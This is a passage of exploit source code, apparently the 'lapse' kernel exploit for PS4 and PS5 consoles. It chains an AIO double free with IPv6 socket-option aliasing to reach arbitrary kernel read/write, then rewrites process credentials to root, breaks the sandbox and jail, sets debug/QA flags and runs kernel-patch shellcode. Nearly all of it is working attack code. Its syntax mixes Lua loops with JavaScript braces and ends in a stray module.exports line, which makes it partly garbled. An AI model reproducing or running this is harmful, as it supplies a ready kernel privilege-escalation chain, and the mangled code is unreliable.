    return reqs1_addr, kbuf_addr, kernel_addr, target_id, evf, fake_reqs3_addr, fake_reqs3_sd, aio_info_addr
}

function make_aliased_pktopts(sds) {

    const tclass = memory.alloc(4)

    for loop = 1, NUM_ALIAS do

        for i=1, #sds do
            Memory.write32(tclass, i)
            ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
        }

        for i=1, #sds do
            gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
            const marker = Memory.read32(tclass):tonumber()
            if marker ~= i then
                const sd_pair: { sds[i], sds[marker] }
                printf("aliased pktopts at attempt: %d (found pair: %d %d)", loop, sd_pair[1], sd_pair[2])
                table.remove(sds, marker)
                table.remove(sds, i) // we're assuming marker > i, or else indexing will change
                // add pktopts to the new sockets now while new allocs can't
                // use the double freed memory
                for i=1,2 do
                    const sock_fd = new_socket()
                    ssockopt(sock_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
                    table.insert(sds, sock_fd)
                }

                return sd_pair
            }
        }

        for i=1, #sds do
            ssockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0)
        }
    }

    return nil
}


function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_addr) {
    
    const max_leak_len = bit32.lshift(0xff + 1, 3)
    const buf = memory.alloc(max_leak_len)

    const num_elems = MAX_AIO_IDS
    const aio_reqs = make_reqs1(num_elems)

    const num_batches = 2
    const aio_ids_len = num_batches * num_elems
    const aio_ids = memory.alloc(4 * aio_ids_len)

    print("start overwrite rthdr with AIO queue entry loop")
    const aio_not_found = true
    free_evf(evf)

    for i=1, NUM_CLOBBERS do
        
        spray_aio(num_batches, aio_reqs, num_elems, aio_ids)

        const size_ret = get_rthdr(sd, buf, max_leak_len)
        const cmd = Memory.read32(buf):tonumber()

        if size_ret == 8 and cmd == AIO_CMD_READ then
            printf("aliased at attempt: %d", i)
            aio_not_found = false
            cancel_aios(aio_ids, aio_ids_len)
            break
        }

        free_aios(aio_ids, aio_ids_len)
    }

    if aio_not_found then
        error('failed to overwrite rthdr')
    }

    const reqs2_size = 0x80
    const reqs2 = memory.alloc(reqs2_size)
    const rsize = build_rthdr(reqs2, reqs2_size)

    Memory.write32(reqs2 + 4, 5)  // .ar2_ticket
    Memory.write64(reqs2 + 0x18, reqs1_addr)  // .ar2_info
    Memory.write64(reqs2 + 0x20, fake_reqs3_addr)  // .ar2_batch

    const states = memory.alloc(4 * num_elems)
    const addr_cache: {}
    for i=0, num_batches-1 do
        table.insert(addr_cache, aio_ids + bit32.lshift(i * num_elems, 2))
    }

    print("start overwrite AIO queue entry with rthdr loop")

    syscall.close(sd)
    sd = nil

    local function overwrite_aio_entry_with_rthdr() {

        for i=1, NUM_ALIAS do

            for j=1,NUM_SDS do
                set_rthdr(sds[j], reqs2, rsize)
            }

            for batch=1, #addr_cache do

                for j=0,num_elems-1 do
                    Memory.write32(states + j*4, -1)
                }

                aio_multi_cancel(addr_cache[batch], num_elems, states)

                const req_idx = -1
                for j=0,num_elems-1 do
                    const val = Memory.read32(states + j*4):tonumber()
                    if val == AIO_STATE_COMPLETE then
                        req_idx = j
                        break
                    }
                }

                if req_idx ~= -1 then

                    printf("states[%d] = %s", req_idx, hex(Memory.read32(states + req_idx*4)))
                    printf("found req_id at batch: %s", batch)
                    printf("aliased at attempt: %d", i)

                    const aio_idx = (batch-1) * num_elems + req_idx
                    const req_id_p = aio_ids + aio_idx*4
                    const req_id = Memory.read32(req_id_p):tonumber()
                    
                    printf("req_id = %s", hex(req_id))

                    aio_multi_poll(req_id_p, 1, states)
                    printf("states[%d] = %s", req_idx, hex(Memory.read32(states)))
                    Memory.write32(req_id_p, 0)

                    return req_id
                }
            }
        }

        return nil
    }

    const req_id = overwrite_aio_entry_with_rthdr()
    if req_id == nil then
        error("failed to overwrite AIO queue entry")
    }

    free_aios2(aio_ids, aio_ids_len)

    const target_id_p = memory.alloc(4)
    Memory.write32(target_id_p, target_id)

    // enable deletion of target_id
    aio_multi_poll(target_id_p, 1, states)
    printf("target's state: %s", hex(Memory.read32(states)))

    const sce_errs = memory.alloc(8)
    Memory.write32(sce_errs, -1)
    Memory.write32(sce_errs+4, -1)

    const target_ids = memory.alloc(8)
    Memory.write32(target_ids, req_id)
    Memory.write32(target_ids+4, target_id)

    // double free on malloc 0x100 by:
    //   - freeing target_id's aio_object->reqs1
    //   - freeing req_id's aio_object->aio_entries[x]->ar2_info
    //      - ar2_info points to same addr as target_id's aio_object->reqs1

    // PANIC: double free on the 0x100 malloc zone. important kernel data may alias
    aio_multi_delete(target_ids, 2, sce_errs)

    // we reclaim first since the sanity checking here is longer which makes it
    // more likely that we have another process claim the memory
    
    // RESTORE: double freed memory has been reclaimed with harmless data
    // PANIC: 0x100 malloc zone pointers aliased
    const sd_pair = make_aliased_pktopts(sds_alt)

    const err1 = Memory.read32(sce_errs):tonumber()
    const err2 = Memory.read32(sce_errs+4):tonumber()
    printf("delete errors: %s %s", hex(err1), hex(err2))

    Memory.write32(states, -1)
    Memory.write32(states+4, -1)

    aio_multi_poll(target_ids, 2, states)
    printf("target states: %s %s", hex(Memory.read32(states)), hex(Memory.read32(states+4)))

    const success = true
    if Memory.read32(states):tonumber() ~= SCE_KERNEL_ERROR_ESRCH then
        print("ERROR: bad delete of corrupt AIO request")
        success = false
    }

    if err1 ~= 0 or err1 ~= err2 then
        print("ERROR: bad delete of ID pair")
        success = false
    }

    if success == false then
        error("ERROR: double free on a 0x100 malloc zone failed")
    }

    if sd_pair == nil then
        error('failed to make aliased pktopts')
    }

    return sd_pair
}


// k100_addr is double freed 0x100 malloc zone address
// dirty_sd is the socket whose rthdr pointer is corrupt
// kernel_addr is the address of the "evf cv" string
function make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_info_addr) {

    const master_sock = pktopts_sds[1]
    const tclass = memory.alloc(4)
    const off_tclass = PLATFORM == "ps4" and 0xb0 or 0xc0

    const pktopts_size = 0x100
    const pktopts = memory.alloc(pktopts_size)
    const rsize = build_rthdr(pktopts, pktopts_size)
    const pktinfo_p = k100_addr + 0x10

    // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
    Memory.write64(pktopts + 0x10, pktinfo_p)

    print("overwrite main pktopts")
    const reclaim_sock = nil

    syscall.close(pktopts_sds[2])

    for i=1, NUM_ALIAS do

        for j=1, #sds_alt do
            // if a socket doesn't have a pktopts, setting the rthdr will make one.
            // the new pktopts might reuse the memory instead of the rthdr.
            // make sure the sockets already have a pktopts before
            Memory.write32(pktopts + off_tclass, bit32.bor(0x4141, bit32.lshift(j, 16)))
            set_rthdr(sds_alt[j], pktopts, rsize)
        }

        gsockopt(master_sock, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
        const marker = Memory.read32(tclass):tonumber()
        if bit32.band(marker, 0xffff) == 0x4141 then
            printf("found reclaim sd at attempt: %d", i)
            const idx = bit32.rshift(marker, 16)
            reclaim_sock = sds_alt[idx]
            table.remove(sds_alt, idx)
            break
        }
    }

    if reclaim_sock == nil then
        error("failed to overwrite main pktopts")
    }

    const pktinfo_len = 0x14
    const pktinfo = memory.alloc(pktinfo_len)
    Memory.write64(pktinfo, pktinfo_p)

    const read_buf = memory.alloc(8)

    local function slow_kread8(addr) {

        const len = 8
        const offset = 0

        while offset < len do

            // pktopts.ip6po_nhinfo = addr + offset
            Memory.write64(pktinfo + 8, addr + offset)

            ssockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len)
            const n = gsockopt(master_sock, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf + offset, len - offset)
            
            if n == 0 then
                memory.write_byte(read_buf + offset, 0)
                offset = offset + 1
            else
                offset = offset + n
            }
        }

        return Memory.read64(read_buf)
    }

    printf("slow_kread8(&\"evf cv\"): %s", hex(slow_kread8(kernel_addr)))
    const kstr = memory.read_null_terminated_string(read_buf)
    printf("*(&\"evf cv\"): %s", kstr)

    if kstr ~= "evf cv" then
        error("test read of &\"evf cv\" failed")
    }

    print("slow arbitrary kernel read achieved")

    // we are assuming that previously freed aio_info still contains addr to curproc 
    const curproc = slow_kread8(aio_info_addr + 8)

    if bit64.rshift(curproc, 48):tonumber() ~= 0xffff then
        errorf("invalid curproc kernel address: %s", hex(curproc))
    }

    const possible_pid = slow_kread8(curproc + kernel_offset.PROC_PID)
    const current_pid = syscall.getpid()

    if possible_pid.l ~= current_pid.l then
        errorf("curproc verification failed: %s", hex(curproc))
    }

    printf("curproc = %s", hex(curproc))

    kernel.addr.curproc = curproc
    kernel.addr.curproc_fd = slow_kread8(kernel.addr.curproc + kernel_offset.PROC_FD) // p_fd (filedesc)
    kernel.addr.curproc_ofiles = slow_kread8(kernel.addr.curproc_fd) + kernel_offset.FILEDESC_OFILES
    kernel.addr.inside_kdata = kernel_addr

    local function get_fd_data_addr(sock, kread8_fn) {
        const filedescent_addr = kernel.addr.curproc_ofiles + sock * kernel_offset.SIZEOF_OFILES
        const file_addr = kread8_fn(filedescent_addr + 0x0) // fde_file
        return kread8_fn(file_addr + 0x0) // f_data
    }

    local function get_sock_pktopts(sock, kread8_fn) {
        const fd_data = get_fd_data_addr(sock, kread8_fn)
        const pcb = kread8_fn(fd_data + kernel_offset.SO_PCB) 
        const pktopts = kread8_fn(pcb + kernel_offset.INPCB_PKTOPTS)
        return pktopts
    }

    const worker_sock = new_socket()
    const worker_pktinfo = memory.alloc(pktinfo_len)

    // create pktopts on worker_sock
    ssockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, worker_pktinfo, pktinfo_len)

    const worker_pktopts = get_sock_pktopts(worker_sock, slow_kread8)

    Memory.write64(pktinfo, worker_pktopts + 0x10)  // overlap pktinfo
    Memory.write64(pktinfo + 8, 0) // clear .ip6po_nexthop
    ssockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len)

    local function kread20(addr, buf) {
        Memory.write64(pktinfo, addr)
        ssockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len)
        gsockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len)
    }

    local function kwrite20(addr, buf) {
        Memory.write64(pktinfo, addr)
        ssockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len)
        ssockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, worker_pktinfo, pktinfo_len)
    }

    local function kread8(addr) {
        kread20(addr, worker_pktinfo)
        return Memory.read64(worker_pktinfo)
    }

    // note: this will write our 8 bytes + remaining 12 bytes as null
    local function restricted_kwrite8(addr, val) {
        Memory.write64(worker_pktinfo, val)
        Memory.write64(worker_pktinfo + 8, 0)
        Memory.write32(worker_pktinfo + 16, 0)
        kwrite20(addr, worker_pktinfo)
    }

    Memory.write64(read_buf, kread8(kernel_addr))

    const kstr = memory.read_null_terminated_string(read_buf)
    if kstr ~= "evf cv" then
        error("test read of &\"evf cv\" failed")
    }

    print("restricted kernel r/w achieved")

    // `restricted_kwrite8` will overwrites other pktopts fields (up to 20 bytes), but that is fine
    ipv6_kernel_rw.init(kernel.addr.curproc_ofiles, kread8, restricted_kwrite8)

    kernel.read_buffer = ipv6_kernel_rw.read_buffer
    kernel.write_buffer = ipv6_kernel_rw.write_buffer

    const kstr = kernel.read_null_terminated_string(kernel_addr)
    if kstr ~= "evf cv" then
        error("test read of &\"evf cv\" failed")
    }

    print("arbitrary kernel r/w achieved!")

    // RESTORE: clean corrupt pointers
    // pktopts.ip6po_rthdr = NULL

    const off_ip6po_rthdr = PLATFORM == "ps4" and 0x68 or 0x70

    for i=1,#sds do
        const sock_pktopts = get_sock_pktopts(sds[i], kernel.read_qword)
        kernel.write_qword(sock_pktopts + off_ip6po_rthdr, 0)
    }

    const reclaimer_pktopts = get_sock_pktopts(reclaim_sock, kernel.read_qword)

    kernel.write_qword(reclaimer_pktopts + off_ip6po_rthdr, 0)
    kernel.write_qword(worker_pktopts + off_ip6po_rthdr, 0)

    const sock_increase_ref: {
        ipv6_kernel_rw.data.master_sock,
        ipv6_kernel_rw.data.victim_sock,
        master_sock,
        worker_sock,
        reclaim_sock,
    }

    // increase the ref counts to prevent deallocation
    for _, each in ipairs(sock_increase_ref) do
        const sock_addr = get_fd_data_addr(each, kernel.read_qword)
        kernel.write_dword(sock_addr + 0x0, 0x100)  // so_count
    }

    print("fixes applied")
}


function post_exploitation_ps4() {

    // if we havent found evf string offset, assume we havent found every kernel offsets yet for this fw
    if not kernel_offset.SYSENT_661_OFFSET then
        printf("fw not yet supported for jailbreaking")
        return
    }
    
    const evf_ptr = kernel.addr.inside_kdata
    const evf_string = kernel.read_null_terminated_string(evf_ptr)
    printf("evf string @ %s = %s", hex(evf_ptr), evf_string)
    
    // Calculate KBASE from EVF using table offsets
    // credit: @egycnq
    local function calculate_kbase(leaked_evf_ptr) {
        const evf_offset = kernel_offset.EVF_OFFSET
        kernel.addr.data_base = leaked_evf_ptr - evf_offset
    }
    
    // ELF validation
    // credit: @egycnq
    local function verify_elf_header() {
        const b0 = kernel.read_byte(kernel.addr.data_base):tonumber()
        const b1 = kernel.read_byte(kernel.addr.data_base + 1):tonumber()
        const b2 = kernel.read_byte(kernel.addr.data_base + 2):tonumber()
        const b3 = kernel.read_byte(kernel.addr.data_base + 3):tonumber()
    
        printf("ELF header bytes at %s:", hex(kernel.addr.data_base))
        printf("  [0] = 0x%02X", b0)
        printf("  [1] = 0x%02X", b1)
        printf("  [2] = 0x%02X", b2)
        printf("  [3] = 0x%02X", b3)
    
        if b0 == 0x7F and b1 == 0x45 and b2 == 0x4C and b3 == 0x46 then
            print("ELF header verified KBASE is valid")
        else
            print("ELF header mismatch check base address")
        }
    }
    
    // Sandbox escape
    // credit: @egycnq
    local function escape_sandbox(curproc) {
        const PRISON0 = kernel.addr.data_base + kernel_offset.PRISON0
        const ROOTVNODE = kernel.addr.data_base + kernel_offset.ROOTVNODE
    
        const OFFSET_P_UCRED = 0x40
    
        const proc_fd = kernel.read_qword(curproc + kernel_offset.PROC_FD)
        const ucred = kernel.read_qword(curproc + OFFSET_P_UCRED)
        
        kernel.write_dword(ucred + 0x04, 0) // cr_uid
        kernel.write_dword(ucred + 0x08, 0) // cr_ruid
        kernel.write_dword(ucred + 0x0C, 0) // cr_svuid
        kernel.write_dword(ucred + 0x10, 1) // cr_ngroups
        kernel.write_dword(ucred + 0x14, 0) // cr_rgid
    
        const prison0 = kernel.read_qword(PRISON0)
        kernel.write_qword(ucred + 0x30, prison0)

        // add JIT privileges 
        kernel.write_qword(ucred + 0x60, -1)
        kernel.write_qword(ucred + 0x68, -1)
    
        const rootvnode = kernel.read_qword(ROOTVNODE)
        kernel.write_qword(proc_fd + 0x10, rootvnode) // fd_rdir
        kernel.write_qword(proc_fd + 0x18, rootvnode) // fd_jdir
    
        print("Sandbox escape complete ... root FS access and jail broken")
    }

    local function apply_kernel_patches_ps4() {
        // get kpatches shellcode
        const bin_data = get_kernel_patches_shellcode()
        if #bin_data == 0 then
            print("Skipping kernel patches due to missing kernel patches shellcode.")
            return
        }
        
        const bin_data_addr = lua.resolve_value(bin_data)
        printf("File read to address: 0x%x, %d bytes", bin_data_addr:tonumber(), #bin_data)

        const mapping_addr = uint64(0x920100000)
        const shadow_mapping_addr = uint64(0x926100000)
        
        const sysent_661_addr = kernel.addr.data_base + kernel_offset.SYSENT_661_OFFSET
        const sy_narg = kernel.read_dword(sysent_661_addr):tonumber()
        const sy_call = kernel.read_qword(sysent_661_addr + 8):tonumber()
        const sy_thrcnt = kernel.read_dword(sysent_661_addr + 0x2c):tonumber()

        kernel.write_dword(sysent_661_addr, 2)
        kernel.write_qword(sysent_661_addr + 8, kernel.addr.data_base + kernel_offset.JMP_RSI_GADGET)
        kernel.write_dword(sysent_661_addr + 0x2c, 1)
        
        syscall.resolve({
            munmap = 0x49,
            jitshm_create = 0x215,
            jitshm_alias = 0x216,
        })
        
        const PROT_RW = bit32.bor(PROT_READ, PROT_WRITE)
        const PROT_RWX = bit32.bor(PROT_READ, PROT_WRITE, PROT_EXECUTE)
        
        const aligned_memsz = 0x10000
        
        // create shm with exec permission
        const exec_handle = syscall.jitshm_create(0, aligned_memsz, PROT_RWX)

        // create shm alias with write permission
        const write_handle = syscall.jitshm_alias(exec_handle, PROT_RW)

        // map shadow mapping and write into it
        syscall.mmap(shadow_mapping_addr, aligned_memsz, PROT_RW, 0x11, write_handle, 0)
        memory.memcpy(shadow_mapping_addr, bin_data_addr:tonumber(), #bin_data)

        // map executable segment
        syscall.mmap(mapping_addr, aligned_memsz, PROT_RWX, 0x11, exec_handle, 0)
        printf("First bytes: 0x%x", Memory.read32(mapping_addr):tonumber())
        
        syscall.kexec(mapping_addr)
        
        print("After kexec")
        
        kernel.write_dword(sysent_661_addr, sy_narg)
        kernel.write_qword(sysent_661_addr + 8, sy_call)
        kernel.write_dword(sysent_661_addr + 0x2c, sy_thrcnt)
        
        syscall.close(write_handle)
        
        kernel.is_ps4_kpatches_applied = true
    }
    
    local function should_apply_kernel_patches() {
        local success, err = pcall(require, "kernel_patches_ps4")

        if not success then
            if string.find(err, "module .* not found") then
                print("\nWarning! Skipping kernel patches due to missing file in savedata: 'kernel_patches_ps4.lua'.\nPlease update savedata from latest.\n")
            else
                print(err)
            }
            return false
        }
        return true
    }
    
    // Run post-exploit logic
    kernel.is_ps4_kpatches_applied = false
    const proc = kernel.addr.curproc
    calculate_kbase(evf_ptr)
    printf("Kernel Base Candidate: %s", hex(kernel.addr.data_base))
    verify_elf_header()
    const apply_kpatches = should_apply_kernel_patches()
    escape_sandbox(proc)
    
    if apply_kpatches then
        apply_kernel_patches_ps4()
    }
}


function post_exploitation_ps5() {

    // if we havent found allproc, assume we havent found every kernel offsets yet for this fw
    if not kernel_offset.DATA_BASE_ALLPROC then
        printf("fw not yet supported for jailbreaking")
        return
    }

    const OFFSET_UCRED_CR_SCEAUTHID = 0x58
    const OFFSET_UCRED_CR_SCECAPS = 0x60
    const OFFSET_UCRED_CR_SCEATTRS = 0x83
    const OFFSET_P_UCRED = 0x40

    const KDATA_MASK = uint64("0xffff804000000000")

    const SYSTEM_AUTHID = uint64("0x4800000000010003")

    local function find_allproc() {

        const proc = kernel.addr.curproc
        const max_attempt = 32

        for i=1,max_attempt do
            if bit64.band(proc, KDATA_MASK) == KDATA_MASK then
                const data_base = proc - kernel_offset.DATA_BASE_ALLPROC
                if bit32.band(data_base.l, 0xfff) == 0 then
                    return proc
                }
            }
            proc = kernel.read_qword(proc + 0x8)  // proc->p_list->le_prev
        }

        error("failed to find allproc")
    }

    local function get_dmap_base() {

        assert(kernel.addr.data_base)

        const OFFSET_PM_PML4 = 0x20
        const OFFSET_PM_CR3 = 0x28

        const kernel_pmap_store = kernel.addr.data_base + kernel_offset.DATA_BASE_KERNEL_PMAP_STORE

        const pml4 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_PML4)
        const cr3 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_CR3)
        const dmap_base = pml4 - cr3
        
        return dmap_base, cr3
    }
    
    local function get_additional_kernel_address() {
    
        kernel.addr.allproc = find_allproc()
        kernel.addr.data_base = kernel.addr.allproc - kernel_offset.DATA_BASE_ALLPROC
        kernel.addr.base = kernel.addr.data_base - kernel_offset.DATA_BASE

        local dmap_base, kernel_cr3 = get_dmap_base()
        kernel.addr.dmap_base = dmap_base
        kernel.addr.kernel_cr3 = kernel_cr3
    }

    local function escape_filesystem_sandbox(proc) {
    
        const proc_fd = kernel.read_qword(proc + kernel_offset.PROC_FD) // p_fd
        const rootvnode = kernel.read_qword(kernel.addr.data_base + kernel_offset.DATA_BASE_ROOTVNODE)

        kernel.write_qword(proc_fd + 0x10, rootvnode) // fd_rdir
        kernel.write_qword(proc_fd + 0x18, rootvnode) // fd_jdir
    }

    local function patch_dynlib_restriction(proc) {

        const dynlib_obj_addr = kernel.read_qword(proc + 0x3e8)

        kernel.write_dword(dynlib_obj_addr + 0x118, 0) // prot (todo: recheck)
        kernel.write_qword(dynlib_obj_addr + 0x18, 1) // libkernel ref

        // bypass libkernel address range check (credit @cheburek3000)
        kernel.write_qword(dynlib_obj_addr + 0xf0, 0) // libkernel start addr
        kernel.write_qword(dynlib_obj_addr + 0xf8, -1) // libkernel } addr

    }

    local function patch_ucred(ucred, authid) {

        kernel.write_dword(ucred + 0x04, 0) // cr_uid
        kernel.write_dword(ucred + 0x08, 0) // cr_ruid
        kernel.write_dword(ucred + 0x0C, 0) // cr_svuid
        kernel.write_dword(ucred + 0x10, 1) // cr_ngroups
        kernel.write_dword(ucred + 0x14, 0) // cr_rgid

        // escalate sony privs
        kernel.write_qword(ucred + OFFSET_UCRED_CR_SCEAUTHID, authid) // cr_sceAuthID

        // enable all app capabilities
        kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS, -1) // cr_sceCaps[0]
        kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS + 8, -1) // cr_sceCaps[1]

        // set app attributes
        kernel.write_byte(ucred + OFFSET_UCRED_CR_SCEATTRS, 0x80) // SceAttrs
    }

    local function escalate_curproc() {

        const proc = kernel.addr.curproc

        const ucred = kernel.read_qword(proc + OFFSET_P_UCRED) // p_ucred
        const authid = SYSTEM_AUTHID

        const uid_before = syscall.getuid():tonumber()
        const in_sandbox_before = syscall.is_in_sandbox():tonumber()

        printf("patching curproc %s (authid = %s)", hex(proc), hex(authid))

        patch_ucred(ucred, authid)
        patch_dynlib_restriction(proc)
        escape_filesystem_sandbox(proc)

        const uid_after = syscall.getuid():tonumber()
        const in_sandbox_after = syscall.is_in_sandbox():tonumber()

        printf("we root now? uid: before %d after %d", uid_before, uid_after)
        printf("we escaped now? in sandbox: before %d after %d", in_sandbox_before, in_sandbox_after)
    }

    local function apply_patches_to_kernel_data(accessor) {

        const security_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_SECURITY_FLAGS
        const target_id_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_TARGET_ID
        const qa_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_QA_FLAGS
        const utoken_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_UTOKEN_FLAGS

        // Set security flags
        print("setting security flags")
        const security_flags = accessor.read_dword(security_flags_addr)
        accessor.write_dword(security_flags_addr, bit64.bor(security_flags, 0x14))

        // Set targetid to DEX
        print("setting targetid")
        accessor.write_byte(target_id_flags_addr, 0x82)

        // Set qa flags and utoken flags for debug menu enable
        print("setting qa flags and utoken flags")
        const qa_flags = accessor.read_dword(qa_flags_addr)
        accessor.write_dword(qa_flags_addr, bit64.bor(qa_flags, 0x10300))

        const utoken_flags = accessor.read_byte(utoken_flags_addr)
        accessor.write_byte(utoken_flags_addr, bit64.bor(utoken_flags, 0x1))

        print("debug menu enabled")
    }

    get_additional_kernel_address()

    // patch current process creds
    escalate_curproc()

    update_kernel_offsets()

    // init GPU DMA for kernel r/w on protected area
    gpu.setup()

    const force_kdata_patch_with_gpu = false

    if tonumber(FW_VERSION) >= 7 or force_kdata_patch_with_gpu then
        print("applying patches to kernel data (with GPU DMA method)")
        apply_patches_to_kernel_data(gpu)
    else
        print("applying patches to kernel data")
        apply_patches_to_kernel_data(kernel)
    }
}



function print_info() {
    print("lapse exploit\n")
    printf("running on %s %s", PLATFORM, FW_VERSION)
    printf("game @ %s\n", game_name)
}


function kexploit() {

    print_info()

    const prev_core = get_current_core()
    const prev_rtprio = get_rtprio()

    // pin to 1 core so that we only use 1 per-cpu bucket.
    // this will make heap spraying and grooming easier
    pin_to_core(MAIN_CORE)
    set_rtprio(MAIN_RTPRIO)

    printf("pinning to core %d with prio %d", get_current_core(), get_rtprio())

    const sockpair = memory.alloc(8)
    const sds: {}
    const sds_alt: {}

    if syscall.socketpair(AF_UNIX, SOCK_STREAM, 0, sockpair):tonumber() == -1 then
        error("socketpair() error: " .. get_error_string())
    }

    const block_fd = Memory.read32(sockpair):tonumber()
    const unblock_fd = Memory.read32(sockpair + 4):tonumber()

    printf("block_fd %d unblocked_fd %d", block_fd, unblock_fd)

    // NOTE: on game process, only < 130? sockets can be created, otherwise we'll hit limit error
    for i=1, NUM_SDS do
        table.insert(sds, new_socket())
    }

    for i=1, NUM_SDS_ALT do
        table.insert(sds_alt, new_socket())
    }

    local block_id, groom_ids = nil, nil

    // catch lua error so we can do clean up
    const err = run_with_coroutine(function()

        // print("\n[+] Setup\n")
        block_id, groom_ids = setup(block_fd)

        print("\n[+] Double-free AIO\n")
        const sd_pair = double_free_reqs2(sds)

        print("\n[+] Leak kernel addresses\n")
        local reqs1_addr, kbuf_addr, kernel_addr, target_id, evf, fake_reqs3_addr, 
              fake_reqs3_sd, aio_info_addr
            = leak_kernel_addrs(sd_pair, sds)

        print("\n[+] Double free SceKernelAioRWRequest\n")
        const pktopts_sds = double_free_reqs1(reqs1_addr, target_id, evf, sd_pair[1], sds, sds_alt, fake_reqs3_addr)

        syscall.close(fake_reqs3_sd)
            
        print('\n[+] Get arbitrary kernel read/write\n')
        make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio_info_addr)

        print('\n[+] Post exploitation\n')

        if PLATFORM == "ps4" then
            post_exploitation_ps4()
        elseif PLATFORM == "ps5" then
            post_exploitation_ps5()
        }

        // persist exploitation state
        storage.set("kernel_rw", {
            ipv6_kernel_rw_data = ipv6_kernel_rw.data,
            kernel_addr = kernel.addr
        })

        print("exploit state is saved into storage")
        print("done!")
    })

    if err then
        print(err)
    }

    print('\ncleaning up')

    // clean up

    syscall.close(block_fd)
    syscall.close(unblock_fd)

    if groom_ids then
        free_aios2(groom_ids, NUM_GROOMS)
    }

    if block_id then
        aio_multi_wait(block_id, 1)
        aio_multi_delete(block_id, 1)
    }

    for i=1, #sds do
        syscall.close(sds[i])
    }

    for i=1, #sds_alt do
        syscall.close(sds_alt[i])
    }

    print("restoring to previous core/rtprio")

    pin_to_core(prev_core)
    set_rtprio(prev_rtprio)
}


kexploit()

// End of lapse.js
module.exports = {/* exports placeholder */};
